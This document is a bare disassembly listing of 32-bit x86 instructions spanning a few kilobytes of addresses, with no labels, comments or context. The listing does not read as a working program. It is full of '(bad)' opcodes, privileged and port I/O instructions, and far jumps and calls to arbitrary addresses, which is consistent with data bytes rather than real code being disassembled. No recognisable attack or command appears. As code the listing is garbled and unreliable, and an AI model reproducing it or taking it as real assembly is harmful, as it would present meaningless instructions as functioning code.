  41b55f:	adc    ebp,edi
  41b561:	(bad)  
  41b562:	jno    0x41b519
  41b564:	jo     0x41b565
  41b566:	xor    bl,0x93
  41b569:	imul   ebx,DWORD PTR [ecx],0x5b
  41b56c:	mov    bh,0x9c
  41b56e:	jnp    0x41b500
  41b570:	push   eax
  41b571:	(bad)  
  41b572:	jne    0x41b509
  41b574:	lods   eax,DWORD PTR ds:[esi]
  41b575:	push   ebp
  41b576:	mov    ecx,0x889529b0
  41b57b:	inc    edx
  41b57c:	xor    ebx,DWORD PTR [eax+0x30]
  41b57f:	xchg   ecx,eax
  41b580:	sbb    DWORD PTR [edx-0x2f],ebx
  41b583:	out    0x1b,eax
  41b585:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b587:	fisubr DWORD PTR [ecx+0x7d71bda0]
  41b58d:	das    
  41b58e:	dec    esp
  41b58f:	popa   
  41b590:	and    BYTE PTR [ebp+0x42cd0efe],ah
  41b596:	iret   
  41b597:	cwde   
  41b598:	xchg   edx,eax
  41b599:	bswap  eax
  41b59b:	jp     0x41b610
  41b59d:	adc    eax,0xffd6d0a4
  41b5a2:	(bad)  
  41b5a3:	ds jo  0x41b5eb
  41b5a6:	sbb    edi,DWORD PTR [ebp-0x5e]
  41b5a9:	mov    al,ds:0xa91083e0
  41b5ae:	mov    ecx,0x2f43388
  41b5b3:	pushf  
  41b5b4:	(bad)  
  41b5b5:	cmp    al,0x7f
  41b5b7:	es cdq 
  41b5b9:	pop    es
  41b5ba:	and    al,0xa0
  41b5bc:	fcmovnbe st,st(5)
  41b5be:	push   edi
  41b5bf:	mov    esi,gs
  41b5c1:	xlat   BYTE PTR ds:[ebx]
  41b5c2:	std    
  41b5c3:	test   eax,0x934650f3
  41b5c8:	inc    esp
  41b5c9:	aaa    
  41b5ca:	push   edi
  41b5cb:	xchg   ecx,eax
  41b5cc:	xor    ecx,DWORD PTR [ecx-0x11]
  41b5cf:	push   edi
  41b5d0:	jmp    0xd408a0a7
  41b5d5:	aad    0x76
  41b5d7:	mov    al,ds:0x75f29359
  41b5dc:	pop    ebx
  41b5dd:	pop    ebp
  41b5de:	adc    BYTE PTR [ebx],al
  41b5e0:	aam    0xbd
  41b5e2:	jbe    0x41b599
  41b5e4:	xchg   BYTE PTR [ebx],al
  41b5e6:	and    DWORD PTR [ebx-0x40],esp
  41b5e9:	shl    DWORD PTR [eax-0xb175a65],1
  41b5ef:	mov    edx,0x1cba227e
  41b5f4:	fsub   QWORD PTR [ecx+0x2c]
  41b5f7:	pop    ebx
  41b5f8:	lods   eax,DWORD PTR ds:[esi]
  41b5f9:	cmc    
  41b5fa:	loop   0x41b61e
  41b5fc:	dec    ecx
  41b5fd:	adc    BYTE PTR [edx+ecx*4-0x69],dh
  41b601:	int3   
  41b602:	jno    0x41b5ce
  41b604:	int3   
  41b605:	mov    ecx,0x7d4f9df3
  41b60a:	jecxz  0x41b602
  41b60c:	sub    al,BYTE PTR [ebx+0x31d4dcf3]
  41b612:	cmp    BYTE PTR [eax],dh
  41b614:	jne    0x41b5fa
  41b616:	mov    dl,0xb4
  41b618:	or     eax,DWORD PTR ds:0x157ee96e
  41b61e:	cmp    dh,dh
  41b620:	scas   eax,DWORD PTR es:[edi]
  41b621:	stos   DWORD PTR es:[edi],eax
  41b622:	inc    edx
  41b624:	sbb    BYTE PTR ds:0x8a47ddb2,cl
  41b62a:	out    dx,al
  41b62b:	loope  0x41b68d
  41b62d:	cli    
  41b62e:	xor    bl,ah
  41b630:	mov    bl,0x1a
  41b632:	pop    ds
  41b633:	fidivr WORD PTR [ebx+esi*1]
  41b636:	mov    ebx,DWORD PTR [edi-0x3c]
  41b639:	es call 0xf21b4f38
  41b63f:	or     al,0x7d
  41b641:	lods   eax,DWORD PTR ds:[esi]
  41b642:	shl    edx,cl
  41b644:	cmp    BYTE PTR [ebp+0x6f],cl
  41b647:	stos   DWORD PTR es:[edi],eax
  41b648:	fwait
  41b649:	or     eax,0xa9ab6115
  41b64e:	and    sp,ax
  41b651:	aaa    
  41b652:	or     al,0x82
  41b654:	loopne 0x41b654
  41b656:	inc    eax
  41b657:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b658:	repnz and eax,0x3cf7415e
  41b65e:	mov    dl,0x6e
  41b660:	xchg   ecx,eax
  41b661:	and    eax,0x2bb8b5f6
  41b666:	iret   
  41b667:	jmp    0x25e1:0x608a8fa5
  41b66e:	imul   ebp,DWORD PTR ds:0x89472e83,0x11
  41b675:	out    dx,eax
  41b676:	xchg   BYTE PTR [esi+0x7f08328a],ah
  41b67c:	in     al,dx
  41b67d:	push   0xc6705180
  41b682:	(bad)  
  41b683:	jmp    0x922255c6
  41b688:	div    ah
  41b68a:	sbb    DWORD PTR [eax+0x57],ebp
  41b68d:	adc    ah,cl
  41b68f:	sbb    ebx,esp
  41b691:	cmc    
  41b692:	(bad)  
  41b693:	adc    BYTE PTR [edi+0x47],0x8c
  41b697:	pop    ss
  41b698:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b699:	(bad)  
  41b69a:	ficomp WORD PTR [esi+0x3678ab53]
  41b6a0:	sar    DWORD PTR [esi+edi*4+0x7eb43615],1
  41b6a7:	cwde   
  41b6a8:	mov    eax,0xc0dffe5
  41b6ad:	xchg   ebp,eax
  41b6ae:	imul   BYTE PTR [eax+0x2d0b6bb7]
  41b6b4:	dec    esp
  41b6b5:	sub    al,0xca
  41b6b7:	sub    edx,DWORD PTR [ecx-0x5f]
  41b6ba:	pop    ebx
  41b6bb:	or     cl,0x6b
  41b6be:	test   DWORD PTR [esi],edx
  41b6c0:	hlt    
  41b6c1:	in     eax,0xdb
  41b6c3:	sar    cl,cl
  41b6c5:	stc    
  41b6c6:	icebp  
  41b6c7:	loop   0x41b67c
  41b6c9:	jge    0x41b72e
  41b6cb:	scas   al,BYTE PTR es:[edi]
  41b6cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6cd:	cmc    
  41b6ce:	inc    edx
  41b6cf:	jne    0x41b6a6
  41b6d1:	mov    dl,0xc5
  41b6d3:	(bad)  
  41b6d5:	bound  esp,QWORD PTR [ecx+0x6f]
  41b6d8:	xor    BYTE PTR [ebp+0x34],al
  41b6db:	xor    dh,BYTE PTR [esi-0x5c]
  41b6de:	xchg   esp,eax
  41b6df:	imul   edx,edi,0xffffffe1
  41b6e2:	scas   al,BYTE PTR es:[edi]
  41b6e3:	jnp    0x41b75a
  41b6e5:	es (bad) 
  41b6e7:	je     0x41b682
  41b6e9:	push   ds
  41b6ea:	cld    
  41b6eb:	arpl   WORD PTR [edx+0xee2216e],cx
  41b6f1:	adc    eax,0x39351d65
  41b6f6:	jo     0x41b766
  41b6f8:	push   ss
  41b6f9:	int3   
  41b6fa:	fstp   QWORD PTR [ebx]
  41b6fc:	cs push ecx
  41b6fe:	pop    esp
  41b6ff:	call   0xd0f3:0x1c9cfbb2
  41b706:	sbb    bl,al
  41b708:	xchg   edi,eax
  41b709:	fistp  QWORD PTR [ebp-0x1575215d]
  41b70f:	mov    ds:0xab954d40,al
  41b714:	dec    esp
  41b715:	pop    ecx
  41b716:	add    bh,bl
  41b718:	jb     0x41b777
  41b71a:	int3   
  41b71b:	shl    cl,cl
  41b71d:	lea    edi,[ecx-0x395b0184]
  41b723:	jecxz  0x41b757
  41b725:	(bad)  
  41b726:	jl     0x41b78f
  41b728:	popf   
  41b729:	cmp    eax,0x19fd687a
  41b72e:	cmp    al,0xf0
  41b730:	ins    BYTE PTR es:[edi],dx
  41b731:	adc    eax,0xef62ed24
  41b736:	(bad)  [edi]
  41b738:	jmp    0xf9e7:0x4bcb8366
  41b73f:	retf   
  41b740:	add    DWORD PTR [edi],edx
  41b742:	push   ebp
  41b743:	lea    eax,[ebp+0x3dbce3b2]
  41b749:	out    dx,al
  41b74a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b74b:	aaa    
  41b74c:	adc    bh,BYTE PTR [ebx+0x4d]
  41b74f:	xchg   ebx,eax
  41b750:	lods   al,BYTE PTR ds:[esi]
  41b751:	call   0x2545483a
  41b756:	test   eax,0x9e80aabf
  41b75b:	pop    ebp
  41b75c:	xor    eax,0xab813074
  41b761:	loop   0x41b74c
  41b763:	pop    es
  41b764:	push   ecx
  41b765:	sub    al,BYTE PTR [edi+0x77]
  41b768:	push   edx
  41b769:	std    
  41b76a:	mov    bl,0xf2
  41b76c:	and    DWORD PTR [eax],esi
  41b76e:	pop    ss
  41b76f:	ds add eax,0x79ccbee9
  41b775:	scas   al,BYTE PTR es:[edi]
  41b776:	sti    
  41b777:	jp     0x41b757
  41b779:	pop    esi
  41b77a:	add    eax,0x1b2bb01d
  41b77f:	dec    esp
  41b780:	aaa    
  41b781:	sbb    eax,0x63ba86ac
  41b786:	loope  0x41b7a1
  41b788:	ret    
  41b789:	sub    eax,0xf0304203
  41b78e:	retf   
  41b78f:	daa    
  41b790:	ins    BYTE PTR es:[edi],dx
  41b791:	adc    al,0x35
  41b793:	call   0x631f360c
  41b798:	mov    bl,dh
  41b79a:	mov    bh,0xe4
  41b79c:	xor    bh,BYTE PTR [ebp+0x2e540bc4]
  41b7a2:	mov    DWORD PTR [eax+edx*2+0x6d594d7a],edx
  41b7a9:	jno    0x41b799
  41b7ab:	cmp    eax,DWORD PTR [ebp-0x34370176]
  41b7b1:	jno    0x41b799
  41b7b3:	mov    WORD PTR [edi],ss
  41b7b5:	mov    dh,0x88
  41b7b7:	or     ecx,esp
  41b7b9:	or     ebx,DWORD PTR [esi+0x5]
  41b7bc:	cld    
  41b7bd:	mul    DWORD PTR [eax+0x66]
  41b7c0:	mov    ebp,0x8d363e55
  41b7c5:	inc    esp
  41b7c6:	adc    edi,DWORD PTR [edi]
  41b7c8:	lock aaa 
  41b7ca:	push   eax
  41b7cb:	cmc    
  41b7cc:	dec    edi
  41b7cd:	mov    bl,0xa1
  41b7cf:	lea    eax,[ebx+eax*8-0x3b]
  41b7d3:	jl     0x41b759
  41b7d5:	xlat   BYTE PTR es:[ebx]
  41b7d7:	icebp  
  41b7d8:	pop    es
  41b7d9:	iret   
  41b7da:	mov    gs,WORD PTR [eax+0x76]
  41b7dd:	sbb    eax,0x81449704
  41b7e2:	pop    es
  41b7e3:	enter  0x3c91,0x2d
  41b7e7:	adc    al,0xa1
  41b7e9:	adc    eax,0x10cc1a48
  41b7ee:	aas    
  41b7ef:	scas   eax,DWORD PTR es:[edi]
  41b7f0:	in     eax,0x2e
  41b7f2:	jae    0x41b857
  41b7f4:	sub    dh,BYTE PTR [edx+0x3a]
  41b7f7:	call   0xd302:0x969cf04
  41b7fe:	inc    ecx
  41b7ff:	mov    esi,0x15448383
  41b804:	enter  0x8b3d,0x24
  41b808:	in     eax,0xce
  41b80a:	addr16 pop ecx
  41b80c:	scas   al,BYTE PTR es:[edi]
  41b80d:	mov    ?,WORD PTR [ebx]
  41b80f:	cmp    BYTE PTR [edi],dl
  41b811:	arpl   WORD PTR [ebx],cx
  41b813:	out    dx,al
  41b814:	in     al,0xb4
  41b816:	pop    esi
  41b817:	cmc    
  41b818:	mov    WORD PTR [esi-0x4a336831],fs
  41b81e:	imul   esp,edx,0xf5072da2
  41b824:	in     al,0x6d
  41b826:	or     BYTE PTR [edi+0x4e0334a],bh
  41b82c:	mov    edx,DWORD PTR [esi+esi*4]
  41b82f:	mov    DWORD PTR [ecx+0x6a],ebx
  41b832:	popa   
  41b833:	sub    eax,0x8ecc27ad
  41b838:	ss jmp 0xc69d8b2d
  41b83e:	(bad)  
  41b83f:	fucomp st(0)
  41b841:	adc    BYTE PTR [eax],bh
  41b843:	in     al,dx
  41b844:	mov    ebp,DWORD PTR [edx]
  41b846:	mov    ch,0xd4
  41b848:	xchg   ebx,eax
  41b849:	pop    edx
  41b84a:	xchg   ecx,eax
  41b84b:	jne    0x41b84e
  41b84d:	out    0x7f,al
  41b84f:	stos   BYTE PTR es:[edi],al
  41b850:	std    
  41b851:	retf   
  41b852:	sar    al,1
  41b854:	ja     0x41b846
  41b856:	mov    edi,0x5348767d
  41b85b:	push   edi
  41b85c:	jae    0x41b803
  41b85e:	xlat   BYTE PTR ds:[ebx]
  41b85f:	sbb    eax,0x92c6c736
  41b864:	hlt    
  41b865:	jg     0x41b874
  41b867:	dec    ecx
  41b868:	mov    esp,0x24da3e9c
  41b86d:	sbb    al,0x34
  41b86f:	mov    dh,0x69
  41b871:	jl     0x41b830
  41b873:	adc    DWORD PTR [esp+esi*1-0x6d688445],ebx
  41b87a:	and    ah,BYTE PTR [edi-0x7d106666]
  41b880:	lods   eax,DWORD PTR ds:[esi]
  41b881:	jp     0x41b86b
  41b883:	jb     0x41b825
  41b885:	dec    edx
  41b886:	push   eax
  41b887:	pop    eax
  41b888:	mov    al,0x3e
  41b88a:	mov    BYTE PTR [edx+0x19af8c15],dh
  41b890:	push   esi
  41b891:	clc    
  41b892:	mul    DWORD PTR [edx+ebp*2-0xa05492f]
  41b899:	hlt    
  41b89a:	stc    
  41b89b:	sbb    ebp,edx
  41b89d:	push   ebp
  41b89e:	sbb    al,0xea
  41b8a0:	cmp    DWORD PTR [esi-0x230795f9],edx
  41b8a6:	fneni(8087 only) 
  41b8a8:	mov    edx,0xf2744ab1
  41b8ad:	nop
  41b8ae:	repz add edx,DWORD PTR cs:[edx+0x2e]
  41b8b3:	xchg   edx,eax
  41b8b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8b5:	iret   
  41b8b6:	(bad)  
  41b8b7:	in     al,dx
  41b8b8:	add    DWORD PTR [edx-0x64ca0c32],edi
  41b8be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8bf:	ficomp WORD PTR [ecx-0x55d2ef63]
  41b8c5:	pop    ebp
  41b8c6:	xchg   edi,eax
  41b8c7:	loop   0x41b865
  41b8c9:	mov    cl,0xa9
  41b8cb:	adc    cl,dh
  41b8cd:	sbb    DWORD PTR [esi+esi*8-0x18],ebx
  41b8d1:	mov    bh,0x3d
  41b8d3:	outs   dx,BYTE PTR ds:[esi]
  41b8d4:	test   eax,0x1c931b60
  41b8d9:	sub    BYTE PTR [edx+0x3c],ah
  41b8dc:	cmp    BYTE PTR [ecx+0x5],cl
  41b8df:	dec    ecx
  41b8e0:	pop    esp
  41b8e1:	xchg   ebp,eax
  41b8e2:	xor    DWORD PTR [ebp+0xcd8e607],eax
  41b8e8:	mov    WORD PTR [ebx],fs
  41b8ea:	xchg   edx,eax
  41b8eb:	(bad)
  41b8ee:	pop    es
  41b8ef:	rcl    BYTE PTR [ebx],1
  41b8f1:	jne    0x41b93b
  41b8f3:	iret   
  41b8f4:	out    dx,eax
  41b8f5:	or     esp,DWORD PTR [esi-0x56]
  41b8f8:	cmp    cl,cl
  41b8fa:	mov    ecx,0x51ed1e75
  41b8ff:	loope  0x41b952
  41b901:	popf   
  41b902:	push   ebx
  41b903:	imul   edx,DWORD PTR [edi],0x7a
  41b906:	xchg   BYTE PTR [edi+ecx*2-0x61],ch
  41b90a:	jmp    0x41b922
  41b90c:	fstp   TBYTE PTR ds:0x29be2e1b
  41b912:	cld    
  41b913:	inc    esp
  41b914:	sub    BYTE PTR [edx],bh
  41b916:	push   cs
  41b917:	fs mov eax,0xb7270141
  41b91d:	dec    edx
  41b91e:	hlt    
  41b91f:	push   esi
  41b920:	dec    esp
  41b921:	xor    DWORD PTR [ecx],edi
  41b923:	lds    ecx,FWORD PTR [eax+eiz*1]
  41b926:	pop    ds
  41b927:	fs scas al,BYTE PTR es:[edi]
  41b929:	adc    BYTE PTR [edx-0x470920f5],ch
  41b92f:	or     ebx,ebx
  41b931:	push   ecx
  41b932:	adc    al,0x9f
  41b934:	adc    dh,BYTE PTR [esi+0x2bddd305]
  41b93a:	ror    DWORD PTR [ebx+0x75],cl
  41b93d:	in     al,dx
  41b93e:	adc    cl,BYTE PTR [ebx]
  41b940:	push   es
  41b941:	push   ds
  41b942:	cli    
  41b943:	data16 adc dh,BYTE PTR [ecx+edi*1+0x7d]
  41b948:	mov    ebp,gs
  41b94a:	dec    esp
  41b94b:	int    0x24
  41b94d:	lods   al,BYTE PTR ds:[esi]
  41b94e:	push   ds
  41b94f:	jnp    0x41b9b2
  41b951:	mov    eax,0x2d5808bd
  41b956:	jl     0x41b8f4
  41b958:	mov    ah,0x78
  41b95a:	ja     0x41b8fe
  41b95c:	push   0x73bdb435
  41b961:	loopne 0x41b97a
  41b963:	pop    esi
  41b964:	add    al,0xd9
  41b966:	cmp    ebp,DWORD PTR [esi-0x9704c6]
  41b96c:	shl    BYTE PTR [ecx],0x36
  41b96f:	or     eax,0x841562bd
  41b974:	dec    esp
  41b975:	les    edx,FWORD PTR [eax+0x40]
  41b978:	xchg   ecx,eax
  41b979:	fdivr  st(5),st
  41b97b:	fs popa 
  41b97d:	mov    bl,0x6a
  41b97f:	mov    esi,eax
  41b981:	mov    ebp,0xe6e526ae
  41b986:	repnz dec esi
  41b988:	dec    ecx
  41b989:	pop    esp
  41b98a:	push   ss
  41b98b:	inc    edi
  41b98c:	dec    edi
  41b98d:	in     eax,dx
  41b98e:	inc    esi
  41b98f:	push   ebx
  41b990:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b992:	stos   DWORD PTR es:[edi],eax
  41b993:	pop    es
  41b994:	popa   
  41b995:	(bad)  
  41b997:	les    ebp,FWORD PTR [ebx+0x25]
  41b99a:	adc    esi,ecx
  41b99c:	shl    BYTE PTR [edx+0x24],1
  41b99f:	ss inc eax
  41b9a1:	pop    edi
  41b9a2:	jge    0x41b9b2
  41b9a4:	sahf   
  41b9a5:	xchg   BYTE PTR [ebx],dh
  41b9a7:	stos   DWORD PTR es:[edi],eax
  41b9a8:	leave  
  41b9a9:	aaa    
  41b9aa:	push   edi
  41b9ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9ac:	jmp    0x41ba14
  41b9ae:	aaa    
  41b9af:	or     al,0xb2
  41b9b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9b2:	sbb    al,0xe9
  41b9b4:	mov    edi,0xfda500a3
  41b9b9:	add    al,0x10
  41b9bb:	pop    edx
  41b9bc:	sti    
  41b9bd:	mov    dl,0x65
  41b9bf:	lods   al,BYTE PTR ds:[esi]
  41b9c0:	fsub   st(4),st
  41b9c2:	pop    ecx
  41b9c3:	clc    
  41b9c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b9c5:	adc    BYTE PTR [edi+0x51],bl
  41b9c8:	or     al,0x67
  41b9ca:	out    0xe3,al
  41b9cc:	std    
  41b9cd:	cmp    BYTE PTR [edi+0x2224c91a],bh
  41b9d3:	pop    ds
  41b9d4:	iret   
  41b9d5:	and    BYTE PTR [ebp+0x3f49ef46],cl
  41b9db:	sbb    BYTE PTR [ecx-0x63],bl
  41b9de:	popf   
  41b9df:	mov    BYTE PTR [ecx],al
  41b9e1:	cwde   
  41b9e2:	adc    ch,BYTE PTR [ebp-0x53757a30]
  41b9e8:	hlt    
  41b9e9:	mov    edx,edi
  41b9eb:	cmc    
  41b9ec:	mov    ah,0x42
  41b9ee:	pop    ss
  41b9ef:	lahf   
  41b9f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9f1:	div    DWORD PTR [esi-0x7f]
  41b9f4:	rcl    DWORD PTR [ebp+ebx*4-0x71904c65],cl
  41b9fb:	push   ss
  41b9fc:	mov    DWORD PTR [ebx-0x29],ebp
  41b9ff:	cmp    ch,BYTE PTR [edi-0x1308b77f]
  41ba05:	das    
  41ba06:	dec    edx
  41ba07:	mov    dl,0xfc
  41ba09:	cld    
  41ba0a:	mov    fs,WORD PTR [ebx+eax*4]
  41ba0d:	dec    edi
  41ba0e:	sub    cl,BYTE PTR [edi-0x7]
  41ba11:	ror    BYTE PTR [esi*8-0x4009ecec],1
  41ba18:	bound  edx,QWORD PTR [edx-0x293fd94]
  41ba1e:	push   ds
  41ba1f:	xor    al,0x0
  41ba21:	cmp    DWORD PTR [edi+0x72],0x1b3eb7f4
  41ba28:	dec    ecx
  41ba29:	pop    ecx
  41ba2a:	cmp    dl,BYTE PTR ds:0xa6aa3a56
  41ba30:	pusha  
  41ba31:	neg    DWORD PTR [edx]
  41ba33:	mov    al,0x65
  41ba35:	xchg   ecx,eax
  41ba36:	pop    ss
  41ba37:	pusha  
  41ba38:	mov    edi,0xb52ba4ee
  41ba3d:	ins    BYTE PTR es:[edi],dx
  41ba3e:	mov    esp,0x54fcab89
  41ba43:	call   0xc991:0x144f186b
  41ba4a:	mov    edi,0x12c9da3e
  41ba4f:	ja     0x41baa5
  41ba51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba52:	lea    ebp,[edi-0x2]
  41ba55:	out    dx,eax
  41ba56:	mov    dh,0xd3
  41ba58:	pop    edx
  41ba59:	fsubr  DWORD PTR [ebx]
  41ba5b:	sar    BYTE PTR [edx-0x7026cdec],1
  41ba61:	lahf   
  41ba62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba63:	xchg   BYTE PTR [edx+0x731eae40],bl
  41ba69:	mov    eax,0xda2c7909
  41ba6e:	mov    es,WORD PTR [ebp+0x1]
  41ba71:	mov    ecx,0x89229765
  41ba76:	ins    DWORD PTR es:[edi],dx
  41ba77:	(bad)  
  41ba78:	out    dx,eax
  41ba79:	and    eax,0x595d2f52
  41ba7e:	iret   
  41ba7f:	xlat   BYTE PTR ds:[ebx]
  41ba80:	mov    BYTE PTR [esi-0x39],ah
  41ba83:	les    edx,FWORD PTR [esi]
  41ba85:	mov    eax,ds:0x84a759b0
  41ba8a:	(bad)  [edx+0xc9bbaa1]
  41ba90:	jge    0x41ba12
  41ba92:	mov    esp,0x23dd923e
  41ba97:	cs pop ebx
  41ba99:	or     cl,BYTE PTR [ebx+0x5520a4f7]
  41ba9f:	mov    ah,0x45
  41baa1:	and    al,0x53
  41baa3:	mov    ebx,ebp
  41baa5:	shl    DWORD PTR [edi],0x7a
  41baa8:	aad    0xac
  41baaa:	lock sub al,0x99
  41baad:	pop    ecx
  41baae:	xor    eax,0xefe5669f
  41bab3:	test   eax,0xa737759
  41bab8:	jns    0x41bae0
  41baba:	push   esp
  41babb:	pop    edi
  41babc:	arpl   bp,si
  41babe:	bound  esp,QWORD PTR [edi-0x2acebae]
  41bac4:	fs push 0x17
  41bac7:	add    ah,dl
  41bac9:	push   eax
  41baca:	hlt    
  41bacb:	jno    0x41bb45
  41bacd:	arpl   WORD PTR [eax+0x5d243919],bp
  41bad3:	pop    ecx
  41bad4:	pop    ss
  41bad5:	jnp    0x41bb2d
  41bad7:	adc    edi,0x10
  41bada:	or     cl,BYTE PTR [edi+0x22c05e2a]
  41bae0:	or     edx,edi
  41bae2:	aaa    
  41bae3:	in     eax,0x17
  41bae5:	cdq    
  41bae6:	mov    ds:0x794e76e6,al
  41baeb:	aas    
  41baec:	out    0x8f,al
  41baee:	adc    eax,0x55fd5778
  41baf3:	or     dh,ch
  41baf5:	jmp    0x41bb20
  41baf7:	xchg   edx,eax
  41baf8:	pop    ebx
  41baf9:	xchg   esi,eax
  41bafa:	mov    ch,0x18
  41bafc:	aaa    
  41bafd:	(bad)  
  41bafe:	ins    BYTE PTR es:[edi],dx
  41baff:	(bad)  
  41bb00:	xlat   BYTE PTR ds:[ebx]
  41bb01:	lea    edx,[ebx-0x80]
  41bb04:	in     eax,0xb8
  41bb06:	or     al,0x1b
  41bb08:	aas    
  41bb09:	xchg   esp,eax
  41bb0a:	loope  0x41bad4
  41bb0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb0d:	loope  0x41bb1c
  41bb0f:	mov    edi,0x7c857e1f
  41bb14:	das    
  41bb15:	or     al,0xce
  41bb17:	mov    cs,WORD PTR [edx]
  41bb19:	dec    edi
  41bb1a:	sub    esi,edi
  41bb1c:	aad    0x9
  41bb1e:	push   ss
  41bb1f:	mul    DWORD PTR [ebp-0x3727add3]
  41bb25:	fisubr WORD PTR [ebx+0x198da85]
  41bb2b:	mov    eax,0xf7a7848
  41bb30:	add    DWORD PTR [ebx],edx
  41bb32:	adc    DWORD PTR [eax+ebp*2-0x4a],ecx
  41bb36:	js     0x41bb6a
  41bb38:	rcr    esi,cl
  41bb3a:	xchg   BYTE PTR [ecx-0x48436a63],ch
  41bb40:	add    eax,0x4c38bf7a
  41bb45:	pop    edi
  41bb46:	jle    0x41bbab
  41bb48:	pop    esp
  41bb49:	xchg   ebx,eax
  41bb4a:	xor    al,0xf5
  41bb4c:	rol    BYTE PTR [ebx],cl
  41bb4e:	sub    al,0x8b
  41bb50:	xor    BYTE PTR [edi+0x2d],ah
  41bb53:	sar    DWORD PTR [eax],0x1b
  41bb56:	mov    esi,ebx
  41bb58:	daa    
  41bb59:	stos   DWORD PTR es:[edi],eax
  41bb5a:	sub    BYTE PTR [edi],bl
  41bb5c:	and    BYTE PTR [ecx],0xf8
  41bb5f:	loope  0x41bb73
  41bb61:	adc    cl,BYTE PTR [eax-0x56c41b0e]
  41bb67:	jmp    0x41bb17
  41bb69:	xor    al,0x34
  41bb6b:	mov    esp,0x98b3816c
  41bb70:	repnz push ecx
  41bb72:	push   0x7d066ff3
  41bb77:	pop    ss
  41bb78:	cs stos DWORD PTR es:[edi],eax
  41bb7a:	in     eax,0xb0
  41bb7c:	iret   
  41bb7d:	cwde   
  41bb7e:	mov    ecx,0x4916ff28
  41bb83:	jge    0x41bb5c
  41bb85:	popa   
  41bb86:	cdq    
  41bb87:	mov    edi,0xeb801117
  41bb8c:	sub    al,0x34
  41bb8e:	mov    esp,0xe8e82e73
  41bb93:	sbb    al,0x3e
  41bb95:	pop    esi
  41bb96:	lods   al,BYTE PTR ds:[esi]
  41bb97:	adc    eax,DWORD PTR [bp-0x19f1]
  41bb9c:	addr16 (bad) 
  41bb9e:	pop    ss
  41bb9f:	sbb    bl,dh
  41bba1:	xchg   DWORD PTR [ebp+0x5e16291],esp
  41bba7:	adc    bl,BYTE PTR [eax-0x35fb6ab2]
  41bbad:	xor    bh,BYTE PTR [edi-0x1f]
  41bbb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbb1:	or     al,0x75
  41bbb3:	into   
  41bbb4:	ja     0x41bc32
  41bbb6:	ret    0x1adc
  41bbb9:	lods   al,BYTE PTR gs:[esi]
  41bbbb:	xchg   edx,eax
  41bbbc:	fs enter 0xbaea,0x40
  41bbc1:	imul   eax
  41bbc3:	data16 xor BYTE PTR [esi+0x1068c08c],bl
  41bbca:	sar    BYTE PTR [ebp+0x614fa5e8],0x93
  41bbd1:	dec    esp
  41bbd2:	ret    0x6d96
  41bbd5:	xchg   edi,eax
  41bbd6:	ret    
  41bbd7:	jp     0x41bbaf
  41bbd9:	cmc    
  41bbda:	js     0x41bbb3
  41bbdc:	mov    ecx,0x17e9fe5a
  41bbe1:	dec    ebp
  41bbe2:	cmp    al,0x57
  41bbe4:	sbb    al,0xb1
  41bbe6:	fwait
  41bbe7:	xor    al,0x39
  41bbe9:	lds    edi,FWORD PTR [esi+edx*2]
  41bbec:	pop    es
  41bbed:	nop
  41bbee:	call   0xf0f2:0x1c57b23d
  41bbf5:	cmp    eax,0xe79a38ba
  41bbfa:	jmp    0xd75f:0xbd97f828
  41bc01:	aam    0xda
  41bc03:	and    eax,0xee6a0f66
  41bc08:	test   dh,0x11
  41bc0b:	mov    edi,0xade4ab90
  41bc10:	mov    ebp,0x3de587ba
  41bc15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc16:	stc    
  41bc17:	sbb    al,0xc7
  41bc19:	fwait
  41bc1a:	add    BYTE PTR [ebx-0x39ab851e],bl
  41bc20:	push   ebp
  41bc21:	popf   
  41bc22:	iret   
  41bc23:	lods   eax,DWORD PTR ds:[esi]
  41bc24:	shl    dh,cl
  41bc26:	adc    ebx,DWORD PTR [esi-0x20703ef1]
  41bc2c:	xor    ebp,eax
  41bc2e:	inc    esi
  41bc2f:	pop    ss
  41bc30:	jl     0x41bc08
  41bc32:	cs xchg edx,eax
  41bc34:	cld    
  41bc35:	add    al,BYTE PTR [edx+0x75]
  41bc38:	adc    esi,DWORD PTR [eax-0x5848784f]
  41bc3e:	xchg   al,cl
  41bc40:	inc    ecx
  41bc41:	dec    ebx
  41bc42:	jl     0x41bc02
  41bc44:	nop
  41bc45:	call   0x7c4f:0x1a895666
  41bc4c:	pop    edx
  41bc4d:	rcl    BYTE PTR [eax+0x37e3fa3d],1
  41bc53:	sub    esp,edx
  41bc55:	xor    al,0xb5
  41bc57:	scas   eax,DWORD PTR es:[edi]
  41bc58:	hlt    
  41bc59:	ss out 0x63,eax
  41bc5c:	outs   dx,DWORD PTR ds:[esi]
  41bc5d:	push   edi
  41bc5e:	ss js  0x41bc52
  41bc61:	loopne 0x41bc36
  41bc63:	aas    
  41bc64:	dec    ebx
  41bc65:	jnp    0x41bcc0
  41bc67:	jne    0x41bc40
  41bc69:	jl     0x41bce9
  41bc6b:	dec    eax
  41bc6c:	(bad)  
  41bc6d:	popa   
  41bc6e:	add    eax,ecx
  41bc70:	(bad)  
  41bc71:	call   0xa144:0xfa86ecc1
  41bc78:	xchg   esi,eax
  41bc79:	xor    ebp,DWORD PTR [ebp-0x72ab4bca]
  41bc7f:	push   esp
  41bc80:	icebp  
  41bc81:	push   es
  41bc82:	cmc    
  41bc83:	mov    ds:0x442a5178,al
  41bc88:	arpl   WORD PTR [ebx],cx
  41bc8a:	cli    
  41bc8b:	push   ds
  41bc8c:	in     eax,0x15
  41bc8e:	jg     0x41bc1c
  41bc90:	fs scas eax,DWORD PTR es:[edi]
